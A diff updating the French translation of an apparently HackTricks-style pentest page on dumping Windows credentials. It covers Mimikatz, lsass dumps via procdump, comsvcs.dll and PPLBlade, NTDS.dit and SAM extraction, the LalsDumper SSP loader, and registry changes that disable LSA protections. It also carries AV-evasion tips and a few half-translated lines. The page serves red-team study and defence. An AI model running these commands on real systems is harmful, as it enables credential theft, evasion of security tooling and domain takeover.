@@ -2,7 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Credentials Mimikatz
+## Identifiants Mimikatz
 
 ```bash
 #Elevate Privileges to extract the credentials
@@ -18,7 +18,7 @@ lsadump::sam
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
 
-**Découvrez d’autres choses que Mimikatz peut faire sur** [**cette page**](credentials-mimikatz.md)**.**
+**Découvrez d'autres choses que Mimikatz peut faire sur** [**cette page**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
 
@@ -30,9 +30,9 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 [**Découvrez ici quelques protections possibles des identifiants.**](credentials-protections.md) **Ces protections pourraient empêcher Mimikatz d’extraire certains identifiants.**
 
-## Credentials avec Meterpreter
+## Identifiants avec Meterpreter
 
-Utilisez le [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** j’ai créé pour **rechercher des mots de passe et des hashes** sur la victime.
+Utilisez le [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** j’ai créé pour **rechercher des mots de passe et des hashes** sur la machine victime.
 
 ```bash
 #Credentials from SAM
@@ -55,8 +55,8 @@ mimikatz_command -f "lsadump::sam"
 
 ### Procdump + Mimikatz
 
-Comme **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**est un outil Microsoft légitime**, il n’est pas détecté par Defender.\
-Vous pouvez utiliser cet outil pour **dump le processus lsass**, **télécharger le dump** et **extraire localement** les **identifiants** à partir du dump.
+Comme **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**est un outil légitime de Microsoft**, Defender ne le détecte pas.\
+Vous pouvez utiliser cet outil pour **créer un dump du processus lsass**, **télécharger le dump** et **en extraire** les **identifiants localement**.
 
 Vous pouvez également utiliser [SharpDump](https://github.com/GhostPack/SharpDump).
 
@@ -77,15 +77,15 @@ mimikatz # sekurlsa::minidump lsass.dmp
 mimikatz # sekurlsa::logonPasswords
 ```
 
-Ce processus est effectué automatiquement avec [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+This processus est effectué automatiquement avec [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Remarque** : Certains **AV** peuvent **détecter** comme **malveillant** l’usage de **procdump.exe pour dumper lsass.exe**, car ils **détectent** les chaînes **« procdump.exe » et « lsass.exe »**. Il est donc plus **discret** de **passer** en **argument** le **PID** de lsass.exe à procdump **plutôt que** le **nom lsass.exe.**
+**Remarque** : Certains **AV** peuvent **détecter** l’utilisation de **procdump.exe pour dumper lsass.exe** comme **malveillante**, car ils **détectent** les chaînes **« procdump.exe » et « lsass.exe »**. Il est donc plus **discret** de **passer** le **PID** de lsass.exe à procdump en **argument**, plutôt que le **nom lsass.exe**.
 
-### Dumping lsass with **comsvcs.dll**
+### Dumping lsass avec **comsvcs.dll**
 
-Une DLL nommée **comsvcs.dll**, présente dans `C:\Windows\System32`, est chargée de **dumper la mémoire des processus** en cas de plantage. Cette DLL comprend une **fonction** nommée **`MiniDumpW`**, conçue pour être appelée à l’aide de `rundll32.exe`.\
-Les deux premiers arguments n’ont pas d’importance, mais le troisième est divisé en trois éléments. Le premier correspond au PID du processus à dumper, le deuxième à l’emplacement du fichier dump et le troisième est obligatoirement le mot **full**. Il n’existe pas d’autres options.\
-Une fois ces trois éléments analysés, la DLL crée le fichier dump et y transfère la mémoire du processus spécifié.\
+Une DLL nommée **comsvcs.dll**, présente dans `C:\Windows\System32`, est chargée de **dumper la mémoire d’un processus** en cas de plantage. Cette DLL comprend une **fonction** nommée **`MiniDumpW`**, conçue pour être appelée à l’aide de `rundll32.exe`.\
+Il n’est pas nécessaire d’utiliser les deux premiers arguments, mais le troisième est divisé en trois composants. Le premier correspond au PID du processus à dumper, le deuxième indique l’emplacement du fichier dump et le troisième doit impérativement être le mot **full**. Il n’existe pas d’autres options.\
+Après avoir analysé ces trois composants, la DLL crée le fichier dump et y transfère la mémoire du processus spécifié.\
 Il est possible d’utiliser **comsvcs.dll** pour dumper le processus lsass, ce qui évite d’avoir à téléverser et exécuter procdump. Cette méthode est décrite en détail sur [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>
 
 La commande suivante est utilisée pour l’exécution :
@@ -96,53 +96,53 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 
 **Vous pouvez automatiser ce processus avec** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
 
-### **Dumping lsass avec Task Manager**
+### **Dump de lsass avec le Gestionnaire des tâches**
 
-1. Faites un clic droit sur la barre des tâches, puis cliquez sur Task Manager
-2. Cliquez sur More details
-3. Recherchez le processus « Local Security Authority Process » dans l’onglet Processes
-4. Faites un clic droit sur le processus « Local Security Authority Process », puis cliquez sur « Create dump file ».
+1. Faites un clic droit sur la barre des tâches, puis cliquez sur Gestionnaire des tâches
+2. Cliquez sur Plus de détails
+3. Recherchez le processus « Local Security Authority Process » dans l’onglet Processus
+4. Faites un clic droit sur le processus « Local Security Authority Process », puis cliquez sur « Créer un fichier dump ».
 
-### Dumping lsass avec procdump
+### Dump de lsass avec procdump
 
 [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) est un binaire signé par Microsoft qui fait partie de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
 
-Un dump de plantage système complet déjà existant, ou une copie compressée dans un dossier utilisateur accessible, peut conserver des éléments d’identification utiles à une analyse hors ligne. Des noms de fichier tels que `MEMORY.DMP` et `MEMORY.7z` sont uniquement des pistes à examiner : vérifiez leur provenance et leur accessibilité, et ne supposez pas qu’ils contiennent des identifiants utilisables ou à jour.
+Un dump complet du système déjà existant, ou une copie compressée dans un dossier utilisateur accessible, peut conserver des données d’identification pour une analyse hors ligne. Les noms de fichiers comme `MEMORY.DMP` et `MEMORY.7z` sont uniquement des pistes à examiner : vérifiez leur provenance et leur accessibilité, et ne supposez pas qu’ils contiennent des identifiants utilisables ou à jour.
 
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
 
-## Dumpin lsass avec PPLBlade
+## Dump de lsass avec PPLBlade
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un outil de dump de processus protégés qui permet d’obfusquer le dump mémoire et de le transférer vers des postes de travail distants sans l’écrire sur le disque.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un outil de dump de processus protégés qui permet d’obfusquer les dumps mémoire et de les transférer vers des postes de travail distants sans les écrire sur le disque.
 
-**Fonctionnalités clés** :
+**Fonctionnalités principales** :
 
 1. Contourner la protection PPL
 2. Obfusquer les fichiers de dump mémoire pour échapper aux mécanismes de détection de Defender basés sur les signatures
-3. Téléverser le dump mémoire via les méthodes RAW et SMB sans l’écrire sur le disque (dump fileless)
+3. Téléverser les dumps mémoire avec les méthodes de téléversement RAW et SMB sans les écrire sur le disque (dump fileless)
 
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
 
-## LalsDumper – Dump LSASS basé sur SSP, sans MiniDumpWriteDump
+## LalsDumper – Dumping de LSASS basé sur SSP sans MiniDumpWriteDump
 
-Ink Dragon utilise un dumper en trois étapes appelé **LalsDumper**, qui n’appelle jamais `MiniDumpWriteDump` : les hooks EDR sur cette API ne se déclenchent donc jamais.<sup>[[3]](#references)</sup>
+Ink Dragon utilise un dumper en trois étapes baptisé **LalsDumper** qui n’appelle jamais `MiniDumpWriteDump`, de sorte que les hooks EDR sur cette API ne se déclenchent jamais :<sup>[[3]](#references)</sup>
 
-1. **Chargeur de l’étape 1 (`lals.exe`)** – recherche dans `fdp.dll` un espace réservé composé de 32 caractères `d` minuscules, le remplace par le chemin absolu vers `rtu.txt`, enregistre la DLL modifiée sous le nom `nfdp.dll`, puis appelle `AddSecurityPackageA("nfdp","fdp")`. Cela force **LSASS** à charger la DLL malveillante comme nouveau Security Support Provider (SSP).
-2. **Étape 2 dans LSASS** – lorsque LSASS charge `nfdp.dll`, la DLL lit `rtu.txt`, applique un XOR à chaque octet avec `0x20`, puis mappe le blob décodé en mémoire avant de transférer l’exécution.
-3. **Étape 3 : dumper** – le payload mappé réimplémente la logique de MiniDump à l’aide de **direct syscalls**, résolus à partir de noms d’API hachés (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Un export dédié nommé `Tom` ouvre `%TEMP%\<pid>.ddt`, écrit un dump LSASS compressé dans le fichier, puis ferme le handle afin que l’exfiltration puisse avoir lieu ultérieurement.
+1. **Stage 1 loader (`lals.exe`)** – recherche dans `fdp.dll` un espace réservé composé de 32 caractères `d` minuscules, le remplace par le chemin absolu vers `rtu.txt`, enregistre la DLL modifiée sous le nom `nfdp.dll`, puis appelle `AddSecurityPackageA("nfdp","fdp")`. Cela force **LSASS** à charger la DLL malveillante en tant que nouveau Security Support Provider (SSP).
+2. **Stage 2 dans LSASS** – quand LSASS charge `nfdp.dll`, la DLL lit `rtu.txt`, applique un XOR à chaque octet avec `0x20` et mappe le blob décodé en mémoire avant de transférer l’exécution.
+3. **Stage 3 dumper** – le payload mappé réimplémente la logique MiniDump à l’aide de **syscalls directs** résolus à partir de noms d’API hachés (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Un export dédié nommé `Tom` ouvre `%TEMP%\<pid>.ddt`, écrit un dump LSASS compressé dans le fichier, puis ferme le handle afin que l’exfiltration puisse avoir lieu plus tard.
 
 Notes pour l’opérateur :
 
-* Gardez `lals.exe`, `fdp.dll`, `nfdp.dll` et `rtu.txt` dans le même répertoire. L’étape 1 remplace l’espace réservé codé en dur par le chemin absolu vers `rtu.txt` ; les séparer interrompt la chaîne.
-* L’enregistrement s’effectue en ajoutant `nfdp` à `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Vous pouvez ajouter cette valeur vous-même pour que LSASS recharge le SSP à chaque démarrage.
+* Gardez `lals.exe`, `fdp.dll`, `nfdp.dll` et `rtu.txt` dans le même répertoire. Stage 1 remplace l’espace réservé codé en dur par le chemin absolu vers `rtu.txt` ; les séparer interrompt la chaîne.
+* L’enregistrement se fait en ajoutant `nfdp` à `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Vous pouvez ajouter cette valeur vous-même pour que LSASS recharge le SSP à chaque démarrage.
 * Les fichiers `%TEMP%\*.ddt` sont des dumps compressés. Décompressez-les localement, puis utilisez Mimikatz/Volatility pour extraire les identifiants.
-* L’exécution de `lals.exe` nécessite des droits d’administrateur/SeTcb pour que `AddSecurityPackageA` réussisse ; dès que l’appel renvoie un résultat, LSASS charge de manière transparente le SSP malveillant et exécute l’étape 2.
-* Supprimer la DLL du disque ne la décharge pas de LSASS. Supprimez l’entrée du registre et redémarrez LSASS (redémarrage du système), ou laissez-la en place pour une persistance à long terme.
+* L’exécution de `lals.exe` nécessite les droits admin/SeTcb pour que `AddSecurityPackageA` réussisse ; dès que l’appel renvoie un résultat, LSASS charge de façon transparente le SSP malveillant et exécute Stage 2.
+* Supprimer la DLL du disque ne la décharge pas de LSASS. Vous devez soit supprimer l’entrée du registre et redémarrer LSASS (en redémarrant la machine), soit la laisser en place pour assurer la persistance à long terme.
 
 ## CrackMapExec
 
@@ -158,14 +158,14 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
 
-### Extraire le NTDS.dit du contrôleur de domaine cible
+### Dump de NTDS.dit depuis le DC cible
 
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
 
-### Dump de l’historique des mots de passe de NTDS.dit depuis le DC cible
+### Extraire l’historique des mots de passe de NTDS.dit depuis le DC cible
 
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
@@ -177,9 +177,9 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
 
-## Vol de SAM et SYSTEM
+## Voler SAM et SYSTEM
 
-Ces fichiers doivent se trouver dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM._ Mais **vous ne pouvez pas simplement les copier normalement**, car ils sont protégés.
+Ces fichiers doivent être **situés** dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM._ Mais **vous ne pouvez pas simplement les copier de manière classique**, car ils sont protégés.
 
 ### Depuis le registre
 
@@ -191,20 +191,20 @@ reg save HKLM\system system
 reg save HKLM\security security
 ```
 
-**Téléchargez** ces fichiers sur votre machine Kali et **extrayez les hashes** à l'aide de :
+**Téléchargez** ces fichiers sur votre machine Kali et **extrayez les hashes** à l’aide de :
 
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
 
-### Volume Shadow Copy
+### Copie instantanée de volume
 
-Vous pouvez copier des fichiers protégés à l’aide de ce service. Vous devez disposer des droits d’administrateur.
+Vous pouvez copier des fichiers protégés à l’aide de ce service. Vous devez être Administrateur.
 
-#### Using vssadmin
+#### Utilisation de vssadmin
 
-Le binaire vssadmin est uniquement disponible dans les versions de Windows Server.
+Le binaire vssadmin est uniquement disponible dans les versions Windows Server.
 
 ```bash
 vssadmin create shadow /for=C:
@@ -236,7 +236,7 @@ Code du livre : [https://0xword.com/es/libros/99-hacking-windows-ataques-a-siste
 
 ### Invoke-NinjaCopy
 
-Enfin, vous pouvez également utiliser le [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) pour copier SAM, SYSTEM et ntds.dit.
+Enfin, vous pouvez également utiliser le [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) pour créer une copie de SAM, SYSTEM et ntds.dit.
 
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
@@ -244,17 +244,17 @@ Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c
 
 ## **Identifiants Active Directory - NTDS.dit**
 
-Le fichier **NTDS.dit** est considéré comme le cœur d’**Active Directory**. Il contient des données essentielles sur les objets utilisateur, les groupes et leurs appartenances. C’est là que sont stockés les **hashes de mots de passe** des utilisateurs du domaine. Ce fichier est une base de données **Extensible Storage Engine (ESE)**, située dans **_%SystemRoom%/NTDS/ntds.dit_**.
+Le fichier **NTDS.dit** est considéré comme le cœur d’**Active Directory** : il contient des données cruciales sur les objets utilisateur, les groupes et leurs appartenances. C’est là que sont stockés les **hashes de mots de passe** des utilisateurs du domaine. Ce fichier est une base de données **Extensible Storage Engine (ESE)** qui se trouve dans **_%SystemRoom%/NTDS/ntds.dit_**.
 
-Cette base de données contient trois tables principales :
+Cette base de données comprend trois tables principales :
 
-- **Data Table** : cette table stocke les informations sur les objets, comme les utilisateurs et les groupes.
-- **Link Table** : elle conserve les relations, telles que les appartenances aux groupes.
-- **SD Table** : les **descripteurs de sécurité** de chaque objet y sont stockés afin d’assurer la sécurité et le contrôle d’accès des objets concernés.
+- **Table Data** : cette table stocke les détails des objets tels que les utilisateurs et les groupes.
+- **Table Link** : elle suit les relations, comme les appartenances aux groupes.
+- **Table SD** : les **descripteurs de sécurité** de chaque objet y sont stockés, afin de garantir la sécurité et le contrôle d’accès des objets enregistrés.
 
-Les recherches de Christoffer Andersson sur la couche base de données documentent plus en détail ces tables et leur comportement selon les versions.<sup>[[8]](#references)</sup>
+Les recherches de Christoffer Andersson sur la couche base de données documentent ces tables et leur comportement selon les versions plus en détail.<sup>[[8]](#references)</sup>
 
-Windows utilise _Ntdsa.dll_ pour interagir avec ce fichier, et celui-ci est utilisé par _lsass.exe_. Une **partie** du fichier **NTDS.dit** peut donc se trouver **dans la mémoire de `lsass`** (il est probable que les données consultées récemment s’y trouvent, afin d’améliorer les performances grâce à un **cache**).
+Windows utilise _Ntdsa.dll_ pour interagir avec ce fichier, et celui-ci est utilisé par _lsass.exe_. Une **partie** du fichier **NTDS.dit** peut donc se trouver **dans la mémoire de `lsass`** (vous y trouverez probablement les données les plus récemment consultées, grâce à l’amélioration des performances permise par un **cache**).
 
 #### Déchiffrer les hashes dans NTDS.dit
 
@@ -264,9 +264,9 @@ Le hash est chiffré trois fois :
 2. Déchiffrer le **hash** à l’aide de **PEK** et de **RC4**.
 3. Déchiffrer le **hash** à l’aide de **DES**.
 
-La **PEK** a la **même valeur sur chaque contrôleur de domaine**, mais elle est **chiffrée** dans **NTDS.dit** avec le **BOOTKEY** propre au contrôleur de domaine, provenant de sa ruche **SYSTEM**. L’extraction des identifiants nécessite donc à la fois **NTDS.dit** et **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).
+La **PEK** a la **même valeur sur chaque contrôleur de domaine**, mais elle est **chiffrée** dans **NTDS.dit** à l’aide du **BOOTKEY** propre à ce contrôleur de domaine, issu de sa ruche **SYSTEM**. Par conséquent, l’extraction des identifiants nécessite à la fois **NTDS.dit** et **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).
 
-### Copier NTDS.dit avec Ntdsutil
+### Copier NTDS.dit à l’aide de Ntdsutil
 
 Disponible depuis Windows Server 2008.
 
@@ -274,9 +274,9 @@ Disponible depuis Windows Server 2008.
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
 
-Vous pouvez également utiliser l’astuce de la [**volume shadow copy**](#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N’oubliez pas que vous aurez également besoin d’une copie du **fichier SYSTEM** (là encore, [**extrayez-le du registre ou utilisez l’astuce de la volume shadow copy**](#stealing-sam-and-system)).
+Vous pouvez également utiliser l’astuce [**volume shadow copy**](#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N’oubliez pas que vous aurez également besoin d’une copie du **fichier SYSTEM** (là encore, utilisez l’astuce [**pour l’extraire du registre ou utiliser la volume shadow copy**](#stealing-sam-and-system)).
 
-### **Extraction des hashes depuis NTDS.dit**
+### **Extraire les hashes de NTDS.dit**
 
 Une fois que vous avez **obtenu** les fichiers **NTDS.dit** et **SYSTEM**, vous pouvez utiliser des outils comme _secretsdump.py_ pour **extraire les hashes** :
 
@@ -284,29 +284,29 @@ Une fois que vous avez **obtenu** les fichiers **NTDS.dit** et **SYSTEM**, vous 
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
 
-Vous pouvez également les **extraire automatiquement** à l’aide d’un utilisateur administrateur de domaine valide :
+Vous pouvez également **les extraire automatiquement** à l’aide d’un utilisateur administrateur de domaine valide :
 
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
 
-Pour les **fichiers NTDS.dit volumineux**, il est recommandé de les extraire à l’aide de [gosecretsdump](https://github.com/c-sto/gosecretsdump).
+For **les fichiers NTDS.dit volumineux**, il est recommandé de les extraire à l'aide de [gosecretsdump](https://github.com/c-sto/gosecretsdump).
 
-Enfin, vous pouvez également utiliser le **module metasploit** : _post/windows/gather/credentials/domain_hashdump_ ou **mimikatz** `lsadump::lsa /inject`
+Enfin, vous pouvez aussi utiliser le **module metasploit** : _post/windows/gather/credentials/domain_hashdump_ ou **mimikatz** `lsadump::lsa /inject`
 
 ### **Extraction des objets de domaine de NTDS.dit vers une base de données SQLite**
 
-Les objets NTDS peuvent être extraits vers une base de données SQLite avec [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). L’outil extrait non seulement les secrets, mais aussi les objets complets et leurs attributs, afin d’en extraire davantage d’informations une fois le fichier NTDS.dit brut récupéré.
+Les objets NTDS peuvent être extraits vers une base de données SQLite avec [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). L'outil extrait non seulement les secrets, mais aussi l'intégralité des objets et de leurs attributs, afin de permettre une extraction d'informations supplémentaires lorsque le fichier NTDS.dit brut a déjà été récupéré.
 
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
 
-La ruche `SYSTEM` est facultative, mais elle permet le déchiffrement des secrets (hashes NT et LM, informations d’identification supplémentaires telles que les mots de passe en clair, clés Kerberos ou de confiance, historiques des mots de passe NT et LM). Parmi les autres informations, les données suivantes sont extraites : comptes utilisateur et machine avec leurs hashes, indicateurs UAC, horodatage de la dernière connexion et du dernier changement de mot de passe, descriptions des comptes, noms, UPN, SPN, groupes et appartenances récursives, arborescence des unités organisationnelles et appartenances, domaines approuvés avec le type, la direction et les attributs des relations d’approbation...
+La ruche `SYSTEM` est facultative, mais elle permet le déchiffrement des secrets (hashes NT & LM, identifiants supplémentaires tels que les mots de passe en clair, les clés Kerberos ou de confiance, l’historique des mots de passe NT & LM). Parmi les autres informations, les données suivantes sont extraites : comptes utilisateur et machine avec leurs hashes, indicateurs UAC, horodatages de dernière connexion et de changement de mot de passe, descriptions des comptes, noms, UPN, SPN, groupes et appartenances récursives, arborescence des unités organisationnelles et appartenances, domaines approuvés avec le type, la direction et les attributs des relations d’approbation...
 
 ## Lazagne
 
-Téléchargez le binaire [ici](https://github.com/AlessandroZ/LaZagne/releases). Vous pouvez utiliser ce binaire pour extraire les identifiants de plusieurs logiciels.
+Téléchargez le binaire depuis [ici](https://github.com/AlessandroZ/LaZagne/releases). Vous pouvez utiliser ce binaire pour extraire des identifiants de plusieurs logiciels.
 
 ```
 lazagne.exe all
@@ -339,15 +339,15 @@ type outpwdump
 
 ### PwDump7
 
-Téléchargez-le depuis [http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7), puis **exécutez-le** : les mots de passe seront extraits.
+Téléchargez-le depuis :[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) et **exécutez-le** : les mots de passe seront extraits.
 
-## Extraction des sessions RDP inactives et affaiblissement des contrôles de sécurité
+## Collecte des sessions RDP inactives et affaiblissement des contrôles de sécurité
 
-Le RAT FinalDraft d’Ink Dragon inclut un tasker `DumpRDPHistory` dont les techniques sont utiles à tout red-teamer :<sup>[[3]](#references)</sup>
+Le RAT FinalDraft d’Ink Dragon inclut une tâche `DumpRDPHistory`, dont les techniques sont utiles à tout red-teamer :<sup>[[3]](#references)</sup>
 
 ### Collecte de télémétrie de type DumpRDPHistory
 
-* **Cibles RDP sortantes** – analysez chaque ruche utilisateur à `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Chaque sous-clé stocke le nom du serveur, `UsernameHint` et l’horodatage de la dernière écriture. Vous pouvez reproduire la logique de FinalDraft avec PowerShell :
+* **Cibles RDP sortantes** – analysez chaque ruche utilisateur dans `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Chaque sous-clé stocke le nom du serveur, `UsernameHint` et l’horodatage de la dernière écriture. Vous pouvez reproduire la logique de FinalDraft avec PowerShell :
 
   ```powershell
   Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
@@ -360,7 +360,7 @@ Le RAT FinalDraft d’Ink Dragon inclut un tasker `DumpRDPHistory` dont les tech
   }
   ```
 
-* **Traces de connexions RDP entrantes** – interrogez le journal `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pour les événements **21** (ouverture de session réussie) et **25** (déconnexion) afin de déterminer qui a administré la machine :
+* **Preuves de connexions RDP entrantes** – interrogez le journal `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pour les ID d’événement **21** (connexion réussie) et **25** (déconnexion) afin de déterminer qui a administré la machine :
 
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
@@ -368,11 +368,11 @@ Le RAT FinalDraft d’Ink Dragon inclut un tasker `DumpRDPHistory` dont les tech
     | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
   ```
 
-Une fois que vous savez quel Domain Admin se connecte régulièrement, dump LSASS (avec LalsDumper/Mimikatz) tant que sa session **déconnectée** existe encore. Le repli de CredSSP + NTLM laisse son vérificateur et ses tokens dans LSASS, qui peuvent ensuite être rejoués via SMB/WinRM pour récupérer `NTDS.dit` ou mettre en place une persistance sur les contrôleurs de domaine.
+Une fois que vous savez quel Domain Admin se connecte régulièrement, dump LSASS (avec LalsDumper/Mimikatz) tant que sa session **déconnectée** existe encore. Le fallback CredSSP + NTLM laisse son vérificateur et ses tokens dans LSASS, qui peuvent ensuite être rejoués via SMB/WinRM pour récupérer `NTDS.dit` ou mettre en place une persistance sur les contrôleurs de domaine.
 
-### Dégradations du registre ciblées par FinalDraft
+### Downgrades du registre ciblés par FinalDraft
 
-Le même implant altère également plusieurs clés de registre pour faciliter le vol d’identifiants :<sup>[[3]](#references)</sup>
+Le même implant modifie également plusieurs clés de registre pour faciliter le vol d’identifiants :<sup>[[3]](#references)</sup>
 
 ```cmd
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
@@ -381,18 +381,18 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t R
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
 ```
 
-* Définir `DisableRestrictedAdmin=1` force la réutilisation complète des identifiants/tickets pendant une session RDP, ce qui permet des pivots de type pass-the-hash.
-* `LocalAccountTokenFilterPolicy=1` désactive le filtrage des jetons UAC, de sorte que les administrateurs locaux obtiennent des jetons sans restriction sur le réseau.
+* `DisableRestrictedAdmin=1` désactive Restricted Admin pour les connexions RDP entrantes ; cela n’active **pas** le pass-the-hash via ce mode. Définir la valeur sur `0` autorise Restricted Admin sur la machine de destination, mais le client doit demander `/RestrictedAdmin` ou utiliser une stratégie qui impose Restricted Admin.<sup>[[14]](#references)</sup> Un hachage seul ne confère pas de droits d’administrateur à distance ; voir [les prérequis d’authentification RDP](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
+* `LocalAccountTokenFilterPolicy=1` désactive le filtrage des jetons UAC afin que les administrateurs locaux obtiennent des jetons sans restriction sur le réseau.
 * `DSRMAdminLogonBehavior=2` permet à l’administrateur DSRM de se connecter lorsque le DC est en ligne, offrant aux attaquants un autre compte intégré à privilèges élevés.
-* `RunAsPPL=0` supprime les protections LSASS PPL, rendant l’accès à la mémoire trivial pour des outils de dump tels que LalsDumper.
+* `RunAsPPL=0` supprime les protections LSASS PPL, rendant l’accès à la mémoire trivial pour les outils d’extraction tels que LalsDumper.
 
 ## Identifiants de configuration hMailServer (après compromission)
 
-Vérifiez les fichiers de configuration exacts `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` et `C:\ProgramData\hMailServer\hMailServer.ini`, selon la disposition de l’installation. Une valeur `[Security] AdministratorPassword=` lisible et non vide est un hash du mot de passe d’administration hMailServer ; elle ne prouve pas qu’il s’agit du mot de passe d’un administrateur Windows. Si cet identifiant est récupéré, tout pivot vers un compte Windows nécessite de vérifier indépendamment la réutilisation du mot de passe et les droits de connexion.
+Vérifiez les fichiers de configuration exacts `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` et `C:\ProgramData\hMailServer\hMailServer.ini` selon la disposition de l’installation. Une valeur `[Security] AdministratorPassword=` lisible et non vide est un hachage de mot de passe d’administration hMailServer ; elle ne prouve pas qu’il s’agit du mot de passe de l’administrateur Windows. Si cet identifiant est récupéré, tout pivot vers un compte Windows nécessite de vérifier séparément la réutilisation du mot de passe et les droits de connexion.
 
-Pour les installations qui utilisent une base de données SQL CE, la valeur distincte `[Database] Password=` du fichier INI protège la base de données. Dans les anciennes installations, cette valeur est chiffrée avec Blowfish à l’aide de la clé statique `THIS_KEY_IS_NOT_SECRET` et d’inversions de l’endianness par mots de 4 octets. Utilisez la chaîne hexadécimale du fichier INI avec cet extrait Python :<sup>[[2]](#references)</sup>
+Pour les installations utilisant une base de données SQL CE, la valeur distincte `[Database] Password=` dans le fichier INI protège la base de données. Dans les installations anciennes, cette valeur est chiffrée avec Blowfish à l’aide de la clé statique `THIS_KEY_IS_NOT_SECRET` et d’inversions de l’ordre des octets par mots de 4 octets. Utilisez la chaîne hexadécimale du fichier INI avec cet extrait Python :<sup>[[2]](#references)</sup>
 
-Vérifiez d’abord que le compte actuel peut lire **à la fois** le fichier INI et la base de données SQL CE `.sdf` correspondante. Le mot de passe du fichier INI protège la base de données ; il est distinct des hashes des comptes de messagerie qui y sont stockés. Inspectez ou mettez à niveau une **copie** d’une base de données utilisée, jamais le fichier en production.
